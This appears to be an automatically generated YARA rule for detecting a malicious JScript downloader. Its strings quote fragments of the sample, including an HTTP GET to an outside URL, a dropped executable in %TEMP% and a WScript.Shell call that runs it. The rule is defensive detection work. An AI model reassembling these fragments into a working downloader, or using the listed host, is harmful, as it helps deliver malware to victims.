rule sig_20160328_171af818882cd15ad4aeef3520bbf6b9 {
  meta:
    description = "datamaliciousorder - file 20160328_171af818882cd15ad4aeef3520bbf6b9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8cd39899b6fcbd8feadc7a020f029d7bbec20d25603f65565d47a5f82a21b0f0"

  strings:
    $s1  = "function Rizdmzca() {return Wkmqulyy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"KhuG4Chs.exe\";};" fullword ascii
    $s2  = "do {WScript[Vdbanvpu](Xfllcck() * 11)} while (Fdyspdr[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Cdsmlh(Lkgwmcslo, Kmzroh){return Lkgwmcslo - Kmzroh;};" fullword ascii
    $s4  = "Fdyspdr[Frwdguxfko](\"GET\", \"http://topreal.us/l1oad\", false);" fullword ascii
    $s5  = "var Wkmqulyy = function Zxihl() {return WScript[Scwsi](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Lwzskznq() {return ((Kefsex == true) && (Kefsex == Nwqjxpn)) ? 1 : Czrfkbx;};" fullword ascii
    $s7  = "function Dzvzfff(Tmubizrfgp){Wkmqulyy[\"Run\"](Tmubizrfgp, Czrfkbx, Czrfkbx);};" fullword ascii
    $s8  = "function Xfllcck(){return 22;};" fullword ascii
    $s9  = "function Kkagoz()" fullword ascii
    $s10 = "function Sqjbxqtqn(Thnwdrrcp) {var Gdbev = (1, 2, 3, 4, 5, Thnwdrrcp); return Gdbev;};" fullword ascii
    $s11 = "var Lnuadkg = new this[\"Date\"]();" fullword ascii
    $s12 = " while (Dljfmhysld){" fullword ascii
    $s13 = "var Nwqjxpn = false;" fullword ascii
    $s14 = "Kefsex = true; " fullword ascii
    $s15 = "function Vzmddgr(){return Vzcctegfr;};" fullword ascii
    $s16 = "Nwqjxpn = true; " fullword ascii
    $s17 = "var Fgbstmtuob = false;" fullword ascii
    $s18 = "var Kefsex = false;" fullword ascii
    $s19 = "return Cdsmlh(Usnawlhfw, Voftukjgp);" fullword ascii
    $s20 = "function Ccakcxl(){return Scwsi;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}